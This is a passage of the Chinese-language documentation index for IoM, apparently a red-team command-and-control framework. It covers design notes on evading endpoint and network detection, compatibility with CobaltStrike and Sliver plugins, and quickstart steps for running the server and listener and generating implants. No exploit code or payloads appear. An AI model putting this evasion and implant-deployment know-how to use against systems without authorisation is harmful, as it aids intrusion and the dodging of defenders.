\u4e0d\u6d89\u53ca\u5e95\u5c42 api \u90e8\u5206\u7684\u4ee3\u7801\u5c06\u4f1a\u5f00\u6e90, \u53ef\u80fd\u5b58\u5728\u4e0e EDR \u5bf9\u6297\u7684\u90e8\u5206\u5219\u4f1a\u4f7f\u7528\u6709\u9650\u5f00\u6e90\u7684\u65b9\u5f0f, \u5c06\u7f16\u8bd1\u597d\u7684 lib \u6587\u4ef6. implant \u4e3b\u4f53\u5728\u7f16\u8bd1\u65f6\u5c06 lib \u9759\u6001\u7f16\u8bd1.</p> <p>\u7aef\u4e0a\u5bf9\u6297\u6f14\u53d8\u81f3\u4eca\u5df2\u7ecf\u6709\u975e\u5e38\u591a\u7684\u5bf9\u6297\u7ef4\u5ea6, \u8fd9\u5e26\u6765\u6700\u76f4\u89c2\u7684\u56f0\u96be\u5c31\u662f\u5de5\u7a0b\u89c4\u6a21, \u6709\u65e0\u6570\u7684\u7ec4\u4ef6\u9700\u8981\u91cd\u65b0\u5b9e\u73b0\u4e00\u904d. \u5305\u62ec\u4f46\u4e0d\u9650\u4e8e:</p> <ul> <li>\u9759\u6001\u7279\u5f81</li> <li>\u7b26\u53f7\u6267\u884c</li> <li>\u5185\u5b58\u7279\u5f81</li> <li>\u884c\u4e3a\u7279\u5f81</li> <li>\u53cd HOOK \u53cd\u5206\u6790</li> <li>...</li> </ul> <p>\u5c06\u8fd9\u4e9b\u7ef4\u5ea6\u843d\u5730\u5230\u5de5\u7a0b\u4e2d, \u5c31\u53d8\u6210\u4e86\u5e9e\u5927\u7684\u9700\u6c42\u8868, \u8fd9\u91cc\u662f\u51b0\u5c71\u4e00\u89d2.</p> <p></p>"},{"location":"IoM/design/#\u6d41\u91cf\u5bf9\u6297-done","title":"\u6d41\u91cf\u5bf9\u6297 (done)","text":"<p>\u73b0\u4ee3 NDR\uff08\u7f51\u7edc\u68c0\u6d4b\u4e0e\u54cd\u5e94\u7cfb\u7edf\uff09, \u540c\u6837\u5728\u591a\u5e74\u7684\u5bf9\u6297\u4e2d\u53d8\u5f97\u5f3a\u5927\u65e0\u6bd4\u3002\u4ece\u6700\u5f00\u59cb\u7684\u7279\u5f81\u68c0\u6d4b\uff0c\u5230\u73b0\u5728\u7684 TLS \u63a2\u9488\u3001\u5927\u6570\u636e\u68c0\u6d4b\u3001\u5a01\u80c1\u60c5\u62a5\u7b49\u7b49\u624b\u6bb5\uff0c \u4ece\u5404\u65b9\u9762\u5bf9\u6076\u610f\u8f6f\u4ef6\u7684\u901a\u8baf\u8fc7\u7a0b\u8fdb\u884c\u68c0\u6d4b\u4e0e\u6253\u51fb\u3002\u4e0d\u540c\u4e8e\u7aef\u4e0a\u5bf9\u6297\uff0c \u53ef\u4ee5\u91c7\u7528\u81ea\u7f1a\u53cc\u624b\u5f0f\u7684\u5148\u950b\u9a6c\uff0c\u6d41\u91cf\u4e0a\u7684\u5bf9\u6297\u907f\u65e0\u53ef\u907f\u3002</p> <p>\u771f\u6b63\u4f7f\u7528\u8fc7\u7684 sliver \u7684\u4eba\u5e94\u8be5\u90fd\u5bf9\u4ed6\u7684\u6d41\u91cf\u76f8\u5173(\u4ee3\u7406,\u7aef\u53e3\u8f6c\u53d1\u7b49)\u7684\u529f\u80fd\u6709\u65e0\u9650\u7684\u5410\u69fd, \u5d29\u6e83, \u5361\u987f, \u6302\u6b7b\u7b49\u7b49\u95ee\u9898\u5c42\u51fa\u4e0d\u7a77. \u4e00\u90e8\u5206\u539f\u56e0\u6765\u81ea sliver \u7684\u5f00\u53d1\u8005\u5bf9\u8fd9\u4e00\u5757\u7684\u5b9e\u73b0\u6709\u4e9b\u7c97\u7cd9\u6709\u8bb8\u591a\u4f1a\u5bfc\u81f4 implant panic \u7684 bug; \u6700\u5173\u952e\u7684\u8fd8\u662f\u8bbe\u8ba1\u4e0a\u7684\u95ee\u9898, sliver \u7684\u4ee3\u7406\u76f8\u5173\u529f\u80fd\u4e0e\u5176\u4ed6\u547d\u4ee4\u4e00\u6837. \u662f\u901a\u8fc7<code>Envelope</code>\u5b9e\u73b0\u7684, \u8fd9\u4e2a\u8bbe\u8ba1\u5728\u5206\u53d1\u547d\u4ee4\u6ca1\u6709\u4ec0\u4e48\u95ee\u9898, \u5728\u4ee3\u7406\u8fd9\u79cd\u591a\u8def\u7684\u6d41\u5f0f\u6570\u636e\u4e2d\u5c31\u663e\u5f97\u6349\u895f\u89c1\u8098\u4e86.</p> <p>\u8981\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898, \u53ea\u9700\u8981\u628a\u6d41\u91cf\u76f8\u5173\u7684\u529f\u80fd\u90fd\u62ce\u51fa\u6765, \u4e0e implant \u5f7b\u5e95\u89e3\u8026, implant \u7aef\u4fdd\u7559\u4e86\u6700\u57fa\u672c\u7684 tcp \u4e0e tls \u4fe1\u9053, \u66f4\u591a\u7684\u62d3\u5c55\u529f\u80fd\u5c06\u901a\u8fc7<code>Read</code>\u4e0e<code>Write</code>\u63a5\u53e3\u4ece\u7b2c\u4e09\u65b9\u5de5\u5177\u4e2d\u83b7\u53d6. \u6b63\u5de7, \u539f\u672c\u7684\u5de5\u5177\u94fe\u4e2d\u5c31\u6709\u4e00\u4e2a\u5168\u80fd\u7684\u6d41\u91cf\u4ee3\u7406\u5de5\u5177, \u73b0\u5728\u5b83\u53c8\u591a\u4e86\u4e00\u4e2a\u7528\u9014, \u5f53\u4f5c implant \u7684\u524d\u7f6e stage.</p> <p>IoM \u7684\u4ee3\u7406\u4e0e\u6d41\u91cf\u96a7\u9053\u7684\u9ad8\u7ea7\u529f\u80fd\u5747\u901a\u8fc7rem\u5b9e\u73b0.</p> <p>\u6211\u4eec\u5c06 rem \u6253\u5305\u6210 dll, \u5e76\u66b4\u9732\u51fa Read \u4e0e Write \u63a5\u53e3. \u8fd9\u6837\u4e0a\u7ebf\u7684\u4e0d\u53ea\u662f implant, \u8fd8\u80fd\u76f4\u63a5\u6253\u901a implant \u7aef\u7684\u7f51\u7edc</p> <p>stage \u6a21\u5f0f:</p> <pre><code>graph LR\n    loader -- \u53cd\u5c04\u52a0\u8f7d --&gt; rem -- \u53cd\u5c04\u52a0\u8f7d --&gt; implant</code></pre> <p>stageless \u6a21\u5f0f:</p> <pre><code>graph LR\n    rem_dll --\u9759\u6001\u7f16\u8bd1--&gt; implant</code></pre> <p>\u5982\u679c\u4e0d\u9700\u8981 rem \u63d0\u4f9b\u7684\u6d41\u91cf\u529f\u80fd, \u4e5f\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 implant \u81ea\u5e26\u7684 tcp+tls. \u53ef\u4ee5\u5728\u4e0a\u7ebf\u518d\u540e<code>execute_pe</code>\u52a0\u8f7d rem \u5efa\u7acb\u4ee3\u7406\u4fe1\u9053</p> <pre><code>graph LR\n    implant -- execute_pe --&gt; rem</code></pre> <p>IoM \u9ed8\u8ba4\u91c7\u7528\u4e86 TCP \u7684\u65b9\u5f0f\u8fdb\u884c\u901a\u8baf\u3002 \u5e76\u652f\u6301 TLS \u4e0e MTLS \u5bf9\u901a\u8baf\u6d41\u91cf\u8fdb\u884c\u52a0\u5bc6. \u5982\u679c\u4f7f\u7528\u4e86 rem \u4f5c\u4e3a\u524d\u7f6e\u52a0\u8f7d\u5668, \u5219\u6240\u6709\u7684\u901a\u8baf\u90fd\u5c06\u88ab rem \u63a5\u7ba1</p> <p>\u66f4\u591a\u534f\u8bae\u7684\u4fe1\u9053\u652f\u6301\u4e0e\u9ad8\u7ea7\u7684\u6d41\u91cf\u5bf9\u6297\u7684\u80fd\u529b, \u5c06\u901a\u8fc7 rem \u62d3\u5c55\u8fd9\u65b9\u9762\u7684\u80fd\u529b. \u8bf7\u89c1rem \u8bbe\u8ba1\u6587\u6863</p>"},{"location":"IoM/design/#\u62d3\u5c55\u80fd\u529b","title":"\u62d3\u5c55\u80fd\u529b","text":"<p>\u7ecf\u8fc7\u591a\u5e74\u7684\u53d1\u5c55\uff0cMSF\u3001CobaltStrike\u3001Sliver \u8fd9\u4e9b\u5de5\u5177\u90fd\u79ef\u7d2f\u4e86\u5e9e\u5927\u7684\u63d2\u4ef6\u751f\u6001\u4e0e\u793e\u533a\u652f\u6301\u3002IoM \u5c1d\u8bd5\u4e86\u6700\u5927\u53ef\u80fd\u7684\u517c\u5bb9\u5df2\u6709\u7684\u63d2\u4ef6\u751f\u6001\u3002</p>"},{"location":"IoM/design/#implant-\u7aef\u63d2\u4ef6","title":"implant \u7aef\u63d2\u4ef6","text":""},{"location":"IoM/design/#\u5df2\u517c\u5bb9\u7684\u63d2\u4ef6\u751f\u6001done","title":"\u5df2\u517c\u5bb9\u7684\u63d2\u4ef6\u751f\u6001(done)","text":"<ul> <li>ReflectiveDLL</li> <li>CRL \u751f\u6001\uff0c\u517c\u5bb9\u80fd\u8fd0\u884c\u5728 CRL \u8fd0\u884c\u65f6\u4e2d\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6</li> <li>CobaltStrike \u7684 BOF \u751f\u6001</li> <li>Powershell \u751f\u6001</li> <li>PE \u751f\u6001, \u517c\u5bb9\u7edd\u5927\u591a\u6570\u7684 PE \u6587\u4ef6</li> <li>sliver Armory\u751f\u6001</li> </ul> <p>\u8fd9\u4e9b\u751f\u6001\u5982\u6b64\u7e41\u6742, \u5982CS\u63d0\u4f9b\u4e86<code>agressor script</code>\u5c06\u8fd9\u4e9b\u62d3\u5c55\u80fd\u529b\u53d8\u6210CNA\u811a\u672c, \u96c6\u6210\u5230\u7528\u6237\u7aef. \u53ef\u4ee5\u5728\u4e0b\u6587\u4e2d\u770b\u5230\u5173\u4e8eIoM\u7684\u63d2\u4ef6\u8bed\u8a00\u7684\u8bbe\u8ba1.</p>"},{"location":"IoM/design/#malice-module-done","title":"malice module (done)","text":"<p>\u5728\u517c\u5bb9\u5df2\u6709\u7684\u63d2\u4ef6\u751f\u6001\u7684\u540c\u65f6\uff0c \u6211\u4eec\u4e5f\u63a8\u51fa\u4e86\u81ea\u5df1\u63d2\u4ef6\u683c\u5f0f\u3002</p> <p>\u80fd\u591f\u53cd\u5c04\u52a0\u8f7d\u91c7\u7528\u672c\u5de5\u5177\u6307\u5b9a\u7ed3\u6784\u7684\u6a21\u5757\uff0c\u9ed8\u8ba4\u4f7f\u7528 rust \u7f16\u5199\uff1b\u540c\u65f6\u652f\u6301\u5b9e\u73b0\u4e86 FFI \u63a5\u53e3\u7684\u5176\u4ed6\u8bed\u8a00\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u5b9e\u73b0\u8de8\u8bed\u8a00\u7684\u6a21\u5757\u70ed\u52a0\u8f7d\u3002</p> <p>\u901a\u8fc7 malice module \u7f16\u5199\u7684\u63d2\u4ef6\u80fd\u5728\u7f16\u8bd1\u65f6\u88ab\u81ea\u7531\u7684\u7ec4\u88c5\uff0c\u6839\u636e\u4e0d\u540c\u7684\u573a\u666f\u6309\u9700\u751f\u6210\u4e0d\u540c\u7684 implant</p>"},{"location":"IoM/design/#\u81ea\u5b9a\u4e49listener-parser-done","title":"\u81ea\u5b9a\u4e49Listener Parser (done)","text":"<p>\u73b0\u5728\u7684listener\u63d0\u4f9b\u4e86\u4e0emalefic\u901a\u8baf\u534f\u8bae\u4ea4\u4e92\u7684parser. \u76ee\u524d\u5b58\u5728\u4e00\u5b9a\u7684\u8026\u5408.</p> <p>\u4f46\u5728IoM\u7684\u8bbe\u8ba1\u4e2d, server/client/listener\u662f\u901a\u7528\u57fa\u7840\u8bbe\u65bd, malefic\u5e76\u4e0d\u662fIoM implant\u7684\u552f\u4e00\u5b9e\u73b0, \u53ef\u4ee5\u5728\u4e0d\u4fee\u6539implant/webshell\u4ee3\u7801\u7684\u60c5\u51b5\u4e0b\u63a5\u5165IoM\u7684\u901a\u7528\u57fa\u7840\u8bbe\u65bd. \u53ea\u9700\u8981\u5728Listener\u7684Parser\u4e2d\u63d0\u4f9b\u5bf9\u5e94\u5199\u7684\u89e3\u6790\u652f\u6301, \u5373\u53ef\u5b9e\u73b0. </p> <p>\u6211\u4eec\u8ba1\u5212\u63d0\u4f9b\u5bf9listener\u7684\u4e8c\u6b21\u5f00\u53d1\u63a5\u53e3\u4e0e\u6587\u6863, \u8ba9listener\u80fd\u652f\u6301\u4efb\u610f\u7684\u7b2c\u4e09\u65b9implant/webshell. \u5e76\u4e14\u6211\u4eec\u4e5f\u4f1a\u63d0\u4f9b\u51b0\u874e/\u54e5\u65af\u62c9 \u4ee5\u53caCS\u7684beacon\u4f5c\u4e3a\u517c\u5bb9\u793a\u8303. </p>"},{"location":"IoM/design/#\u7528\u6237\u4fa7\u63d2\u4ef6-done","title":"\u7528\u6237\u4fa7\u63d2\u4ef6 (done)","text":"<p>CobaltStrike \u63d0\u4f9b\u4e86 Aggressive Script \u4f5c\u4e3a\u7528\u6237\u4fa7\u7684\u63d2\u4ef6\u7f16\u5199\u8bed\u8a00, xiebroC2 \u5219\u4f7f\u7528 lua \u4f5c\u4e3a\u63d2\u4ef6\u7f16\u5199\u7684\u8bed\u8a00. sliver \u4e2d\u5219\u4f7f\u7528\u4e86 SDK \u5b9e\u73b0\u8fd9\u4e2a\u9700\u6c42\uff0cprotobuf+grpc \u51e0\u4e4e\u5929\u7136\u5f97\u5b9e\u73b0\u4e86\u591a\u8bed\u8a00\u7684 SDK. \u6682\u672a\u53d1\u5e03\u7684 sliver1.6 \u8fd8\u901a\u8fc7\u975e\u4ea4\u4e92\u5f0f\u7684\u547d\u4ee4\u884c\u80fd\u5b9e\u73b0\u901a\u8fc7 sh/cmd \u811a\u672c\u8c03\u7528 client \u5b9e\u73b0\u7c7b\u4f3c\u80fd\u529b.</p> <p>IoM \u91c7\u7528\u4e86\u4e0e sliver \u7c7b\u4f3c\u7684\u901a\u8baf\u8bbe\u8ba1, \u56e0\u6b64\u4e5f\u81ea\u7136\u800c\u7136\u80fd\u5bfc\u51fa\u4e00\u4e2a\u57fa\u4e8e protobuf+grpc \u7684\u591a\u8bed\u8a00 SDK, \u901a\u8fc7 protobuf \u751f\u6210\u7684 SDK \u80fd\u8986\u76d6\u5927\u591a\u6570\u8bed\u8a00(\u6765\u81ea google \u7684\u9876\u7ea7\u8de8\u8bed\u8a00\u652f\u6301).</p>"},{"location":"IoM/design/#\u517c\u5bb9-armory-done","title":"\u517c\u5bb9 Armory (done)","text":"<p>\u4ece\u4e0a\u6587\u4e5f\u80fd\u770b\u5f97\u51fa\u6765, \u56e0\u4e3a IoM \u548c sliver \u91c7\u7528\u4e86\u76f8\u4f3c\u7684\u901a\u8baf\u8bbe\u8ba1(\u5b9e\u9645\u4e0a\u4e5f\u590d\u7528\u4e86 sliver \u5927\u91cf server/client \u7684\u4ee3\u7801), \u517c\u5bb9 Armory \u751f\u6001\u4e5f\u53d8\u5f97\u987a\u5176\u81ea\u7136\u4e86.</p> <p>Armory \u751f\u6001\u5206\u4e3a<code>alias</code>\u548c<code>extension</code>\u4e24\u5927\u7c7b, \u901a\u8fc7 https://github.com/sliverarmory/armory/blob/master/armory.json \u4f5c\u4e3a\u63d2\u4ef6\u7d22\u5f15.</p> <p>\u53ef\u4ee5\u4ece\u7d22\u5f15\u4e2d\u627e\u5230\u5bf9\u5e94\u7684\u4ed3\u5e93, \u7136\u540e\u4e0b\u8f7d\u5e76\u52a8\u6001\u52a0\u8f7d\u5230 client/implant \u4e2d.</p> <p>\u5176\u4e2d<code>alias</code>\u5b9e\u9645\u4e0a\u662f\u547d\u4ee4\u7684\u522b\u540d, \u5c06\u4e00\u4e9b\u8f83\u4e3a\u590d\u6742\u7684\u7528\u6cd5\u5c01\u88c5\u4e3a\u56fa\u5b9a\u7684\u9884\u8bbe.</p> <p><code>extension</code> \u5219\u4f1a\u5728 implant \u5185\u5b58\u4e2d\u9a7b\u7559. \u4f8b\u5982\u5927\u91cf\u7684 BOF \u63d2\u4ef6\u90fd\u662f\u901a\u8fc7 extension \u5b9e\u73b0\u7684, \u9996\u5148\u4f1a\u6ce8\u518c<code>coff-loader</code>\u5230 implant \u7684 extension \u6807\u4e2d. \u7136\u540e\u540e\u7eed\u6267\u884c\u7684 extension \u5982\u679c<code>extension.json</code>\u4e2d\u5b58\u5728<code>\"depends_on\": \"coff-loader\"</code> \u5219\u4f1a\u4f7f\u7528 implant \u4e2d\u5bf9\u5e94\u7684 extension \u53bb\u52a0\u8f7d\u8fd9\u4e2a extension.</p> <p>\u6211\u4eec\u53ea\u9700\u8981\u5728 IoM \u4e2d\u5b9e\u73b0\u7c7b\u4f3c\u7684\u64cd\u4f5c, \u5e76\u5c06\u5176\u5bf9\u63a5\u5373\u53ef\u5b8c\u7f8e\u517c\u5bb9 armory.</p>"},{"location":"IoM/design/#\u517c\u5bb9-cna-\u6401\u7f6e","title":"\u517c\u5bb9 CNA (\u6401\u7f6e)","text":"<p>\u5176\u4e2d\u62e5\u6709\u6700\u5927\u793e\u533a\u751f\u6001\u7684 CobaltStrike \u7684 CNA \u63d2\u4ef6\u5982\u679c\u80fd\u88ab\u8fc1\u79fb\u5230 IoM \u4e2d\uff0c \u53ef\u4ee5\u7701\u53bb\u5f88\u591a\u8fc1\u79fb\u4e0e\u91cd\u590d\u5f00\u53d1\u65f6\u95f4. \u8fd9\u4e2a\u76ee\u524d\u6765\u770b\u8fd8\u6709\u5f88\u6709\u6311\u6218\u6027.</p> <p><code>Aggressive Script</code> \u57fa\u4e8e<code>Sleep</code>\u8bed\u8a00\u5b9e\u73b0, \u76ee\u524d\u8fd9\u4e2a\u8bed\u8a00\u53ea\u6709 java \u7684\u5b9e\u73b0. \u5982\u679c\u8981\u517c\u5bb9 CNA \u811a\u672c, \u9996\u5148\u9700\u8981\u80fd\u89e3\u6790\u8fd9\u4e2a\u8bed\u8a00\u7684\u524d\u7aef, \u7136\u540e\u5728\u5176\u4e2d\u6ce8\u518c\u4e0e CobaltStrike \u4e2d\u7684\u6bcf\u4e2a API. \u5c06\u6bcf\u4e2a API \u4e0e IoM \u4e2d\u7684 rpc \u5b9e\u73b0\u540c\u7b49\u529f\u80fd\u7684\u5bf9\u63a5. \u8fd9\u91cc\u9762\u7684\u5de5\u4f5c\u91cf\u975e\u5e38\u5927, \u56e0\u6b64\u6682\u65f6\u6211\u4eec\u8fd8\u89c1\u4e0d\u5230\u8fd9\u4e2a\u529f\u80fd.</p>"},{"location":"IoM/design/#mal-done","title":"Mal (done)","text":"<p>Mal\u63d2\u4ef6\u751f\u6001\u5c06\u63d0\u4f9b</p> <ul> <li>lua\u4e0ego\u7684\u5d4c\u5165\u5f0f\u811a\u672c\u8bed\u8a00\u652f\u6301, \u53ef\u4ee5\u5728client\u52a0\u8f7d\u5bf9\u5e94\u7684\u63d2\u4ef6\u5305. </li> <li>\u5728server\u63d0\u4f9b\u591a\u8bed\u8a00SDK. \u63d0\u4f9b\u4efb\u610f\u8bed\u8a00\u7684rpc\u8c03\u7528</li> </ul> <p>\u901a\u8fc7\u5c06rpc\u6ce8\u518c\u5230client\u7aef\u7684lua/TCL\u4e2d\u51fd\u6570\u5b9e\u73b0\u7c7b\u4f3cCS\u7684agressor_script\u652f\u6301.</p> <p>\u5e76\u901a\u8fc7mals\u4ed3\u5e93\u7d22\u5f15\u793e\u533a\u4e2d\u7684\u63d2\u4ef6\u4ed3\u5e93. </p>"},{"location":"IoM/quickstart/","title":"Internet of Malice \u00b7 \u5feb\u901f\u4e0a\u624b","text":"<p>IoM \u662f\u5305\u542b\u4e86\u4e00\u7cfb\u5217\u4ed3\u5e93\u7684\u590d\u6742\u5de5\u5177\u94fe, \u6211\u4eec\u6b63\u5728\u5168\u529b\u7b80\u5316\u5176\u4f7f\u7528\u4e0a\u7684\u56f0\u96be\u3002</p> <p>quickstart \u4e2d\u5c06\u4f1a\u63d0\u4f9b\u6700\u5c0f\u4f7f\u7528\u8bf4\u660e\u4e0e\u6587\u6863\u5bfc\u822a</p>"},{"location":"IoM/quickstart/#\u5b89\u88c5\u90e8\u7f72server","title":"\u5b89\u88c5\u90e8\u7f72server","text":"<p>Server\u662fIoM\u7684\u6838\u5fc3\u63a7\u5236\u7ec4\u4ef6\uff0c\u8d1f\u8d23\u6570\u636e\u5904\u7406\u3001\u72b6\u6001\u7ba1\u7406\u548c\u4efb\u52a1\u8c03\u5ea6</p> <p>Client\u662f\u7528\u6237\u4ea4\u4e92\u754c\u9762\uff0c\u901a\u8fc7gRPC\u4e0eServer\u901a\u4fe1\uff0c\u7528\u4e8e\u547d\u4ee4\u8f93\u5165\u548c\u7ed3\u679c\u5c55\u793a</p> <p>IoM \u7684 server \u4e0e client \u90fd\u662f\u901a\u8fc7 golang \u7f16\u5199\u7684, \u6253\u5305\u6210\u4e8c\u8fdb\u5236\u6587\u4ef6\u540e\u4e0d\u9700\u8981\u4efb\u4f55\u7684\u4f9d\u8d56\u73af\u5883, \u76f4\u63a5\u8fd0\u884c\u5373\u53ef.</p> <p>v0.1.1 \u7248\u672c\u5f00\u59cb, \u53ef\u4ee5\u4e0d\u518d\u4f9d\u8d56\u4efb\u4f55\u5916\u90e8\u73af\u5883, \u63d0\u4f9b\u4e86\u6700\u57fa\u7840\u7684\u81ea\u52a8\u7f16\u8bd1\u670d\u52a1</p>"},{"location":"IoM/quickstart/#\u4e0b\u8f7d","title":"\u4e0b\u8f7d","text":"<p>\u4e0b\u8f7d server release\u5e76\u8fd0\u884c</p>"},{"location":"IoM/quickstart/#\u8fd0\u884c","title":"\u8fd0\u884c","text":"<pre><code>./malice-network -i [ip]\n</code></pre> <p>Implant\u662f\u5728\u76ee\u6807\u7cfb\u7edf\u4e2d\u6267\u884c\u7684\u6838\u5fc3\u7ec4\u4ef6\uff0c\u8d1f\u8d23\u63a5\u6536\u547d\u4ee4\u5e76\u6267\u884c\u5177\u4f53\u64cd\u4f5c</p> <p>** v0.1.1\u65b0\u7279\u5f81: \u5f00\u7bb1\u5373\u7528 \u9ed8\u8ba4\u60c5\u51b5\u4e0b, server\u4f1a\u4f7f\u7528\u4e91\u7f16\u8bd1\u5bf9\u5e94\u7684implant**</p> <p>\u5b89\u5168\u8b66\u544a, \u4f7f\u7528\u9ed8\u8ba4\u63d0\u4f9b\u7684\u4e91\u7f16\u8bd1\u89c6\u4e3a\u540c\u610f\u7528\u6237\u534f\u8bae</p> <p>\u7528\u6237\u534f\u8bae\u5168\u6587: https://wiki.chainreactors.red/IoM/#%E7%94%A8%E6%88%B7%E5%8D%8F%E8%AE%AE</p> <p>\u53ef\u4ee5\u901a\u8fc7config\u4e2d\u8bbe\u7f6e\u5173\u95ed\u6b64\u529f\u80fd, \u4f7f\u7528docker/github action\u79c1\u6709\u5316\u7f16\u8bd1\u8fc7\u7a0b <pre><code>saas:  \n  enable: false  \n</code></pre></p> (\u975e\u5fc5\u8981) \u81ea\u884c\u7f16\u8bd1 client \u4e0e server <p>\u5982\u9700\u81ea\u5b9a\u7f16\u8bd1\u53ef\u53c2\u7167: (\u81ea\u884c\u7f16\u8bd1\u8bf4\u660e)</p> (\u975e\u5fc5\u8981)\u81ea\u5b9a\u4e49 malefic-network \u7684 config <p>Pipeline\u662f\u6570\u636e\u7ba1\u9053\uff0c\u8d1f\u8d23Listener\u4e0eImplant\u4e4b\u95f4\u7684\u5177\u4f53\u901a\u4fe1\u5b9e\u73b0\uff08\u5982TCP\u3001HTTP\u7b49\uff09</p> <p>\u5728\u4f7f\u7528 client \u81ea\u52a8\u7f16\u8bd1\u65f6, \u4f1a\u81ea\u52a8\u6307\u5b9a pipeline \u7684 address, \u5982\u679c\u9700\u8981\u81ea\u5b9a\u4e49, \u53ef\u4ee5\u901a\u8fc7--address \u4fee\u6539.</p> <p>\u5b89\u88c5\u811a\u672c\u81ea\u52a8\u4f7f\u7528\u7684 config \u4e3a: https://github.com/chainreactors/malice-network/blob/master/server/config.yaml</p> <p>malefic \u7684 config.yaml \u8be6\u7ec6\u914d\u7f6e\u8bf4\u660e</p> (\u975e\u5fc5\u8981)\u72ec\u7acb\u8fd0\u884c listener <p>Listener\u662f\u5206\u5e03\u5f0f\u76d1\u542c\u670d\u52a1\uff0c\u8d1f\u8d23\u4e0eImplant\u7684\u5b9e\u9645\u901a\u4fe1\uff0c\u53ef\u72ec\u7acb\u90e8\u7f72\u5728\u4efb\u610f\u670d\u52a1\u5668\u4e0a</p> <p>listener \u6587\u6863</p> <p>\u4ece v0.0.2 \u5f00\u59cb, \u6211\u4eec\u5408\u5e76\u4e86 listener \u4e0e server \u4e24\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u5230<code>malice-network</code> \u9700\u8981\u5728 \u8fd9\u91cc\u83b7\u53d6<code>listener.yaml</code>\u914d\u7f6e\u6587\u4ef6\u793a\u4f8b</p> <p>\u5047\u8bbe\u662f\u5728\u4e00\u53f0\u72ec\u7acb\u7684\u670d\u52a1\u5668\u4e0a, \u6211\u4eec\u9700\u8981\u5c06\u4e0a\u4e00\u6b65\u9aa4\u4e2d\u4f1a\u81ea\u52a8\u751f\u6210\u7684<code>listener.auth</code>\u590d\u5236\u5230\u5f53\u524d\u76ee\u5f55. \u7136\u540e\u6267\u884c:</p> <pre><code>./malice-network -c listener.yaml\n</code></pre> <p></p> <p>\u53ef\u4ee5\u770b\u5230, \u542f\u52a8\u4e86\u72ec\u7acb\u7684 listener, \u5e76\u4e0e server \u5efa\u7acb\u4e86\u8fde\u63a5.</p>"},{"location":"IoM/quickstart/#\u8fd0\u884c-client","title":"\u8fd0\u884c client","text":""},{"location":"IoM/quickstart/#\u4e0b\u8f7d_1","title":"\u4e0b\u8f7d","text":"<p>\u4e0b\u8f7dIoM release \u5e76\u8fd0\u884c</p> <p>\u5176\u4e2d<code>iom_[os]_[arch]</code>\u5f00\u5934\u7684\u5373\u4e3a client \u7aef.</p>"},{"location":"IoM/quickstart/#\u8fd0\u884c_1","title":"\u8fd0\u884c","text":"<p>\u5728\u4e0a\u4e00\u6b65\u64cd\u4f5c\u4e2d, \u6211\u4eec\u5df2\u7ecf\u8fd0\u884c\u4e86 server, \u5e76\u4e14\u4f1a\u53d1\u73b0\u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u81ea\u52a8\u751f\u6210\u4e86\u4e00\u4e2a\u65b0\u7684\u914d\u7f6e\u6587\u4ef6, <code>admin_[ip].auth</code>. \u8fd9\u4e2a\u6587\u4ef6\u662f IoM \u7684\u8ba4\u8bc1\u51ed\u8bc1, \u8bf7\u4f60\u4fdd\u62a4\u597d\u8fd9\u4e2a\u6587\u4ef6.</p> <p><code>./iom login admin_[server_ip].auth</code> \u5373\u53ef\u4f7f\u7528\u8fd9\u4e2a\u914d\u7f6e\u6587\u4ef6\u767b\u5f55\u5230 server.</p> <p></p> <p>\u8fd0\u884c\u6210\u529f\u4f1a\u8fdb\u5165\u5230\u4ea4\u4e92\u5f0f\u547d\u4ee4, \u8fd9\u91cc\u5c06\u662f\u64cd\u4f5c\u6574\u4e2a IoM \u7684\u5730\u65b9.</p>"},{"location":"IoM/quickstart/#\u4e0b\u8f7dimplant","title":"\u4e0b\u8f7dimplant","text":"<p>\u4e0b\u8f7d\u81ea\u52a8\u7f16\u8bd1\u597d\u7684beacon \u6216pulse</p> <p></p> <p>\u6b64exe\u5373\u4e3aimplant, \u53ef\u901a\u8fc7-f\u6307\u5b9a\u4e0d\u540c\u7684\u8f93\u51fa\u683c\u5f0f\u3002</p>"},{"location":"IoM/quickstart/#\u64cd\u4f5c-implant","title":"\u64cd\u4f5c implant","text":"<p>Session\u662fImplant\u4f1a\u8bdd\u7684\u72b6\u6001\u7ba1\u7406\u7ed3\u6784\uff0c\u4fdd\u5b58\u5355\u4e2aImplant\u7684\u5b8c\u6574\u4fe1\u606f\u548c\u751f\u547d\u5468\u671f</p> <p>\u76ee\u6807\u4e0a\u7ebf\u540e\u9009\u62e9\u5408\u9002\u7684 session \u8fdb\u884c\u64cd\u4f5c</p> <pre><code>session\n</code></pre> <p>\u8fd9\u4e2a\u65f6\u5019\u8f93\u5165<code>help</code> \u5c06\u80fd\u770b\u5230\u8fd9\u4e2a session \u4e0a\u4e0b\u6587\u5b8c\u6574\u53ef\u7528\u7684\u547d\u4ee4.</p> <p>implant \u547d\u4ee4\u624b\u518c</p> <p>client \u547d\u4ee4\u624b\u518c</p> <p>implant \u547d\u4ee4\u624b\u518c</p> <p></p> <p>Enjoy IoM</p>"},{"location":"IoM/roadmap/","title":"Internet of Malice \u00b7 \u8def\u7ebf\u56fe","text":""},{"location":"IoM/roadmap/#\u6574\u4f53\u65b9\u5411","title":"\u6574\u4f53\u65b9\u5411","text":"<p>webshell \u652f\u6301</p> <p>\u6211\u4eec\u5c06\u7ed3\u5408 webshell \u4e2d\u6700\u5148\u8fdb\u7684\u6280\u672f\uff0c\u4ee5\u5171\u4eab\u540c\u4e00\u5957\u63d2\u4ef6\u57fa\u5efa\u7684\u65b9\u5f0f\u53bb\u517c\u5bb9 webshell \u4e2d\u7684\u5404\u79cd\u6280\u672f\u3002</p> <p>\u4e92\u8054\u4e92\u901a</p> <p>IoM  \u4e0a\u7684\u6d41\u91cf\u96a7\u9053\u4e0d\u53ea\u662f\u70b9\u5bf9\u70b9\u7684\uff0c \u8fd8\u5c06\u662f\u7f51\u72b6\u7684\uff0c\u751a\u81f3\u662f\u6784\u5efa\u4e00\u4e2a\u53d7\u63a7\u673a\u5668\u7684\u865a\u62df\u7f51\u7edc\u3002</p> <p>GUI</p> <p>\u53d7\u9650\u4e8e\u5404\u79cd\u539f\u56e0\uff0c \u6211\u4eec\u6682\u65f6\u6ca1\u6709\u5b9e\u73b0\u4e00\u4e2a 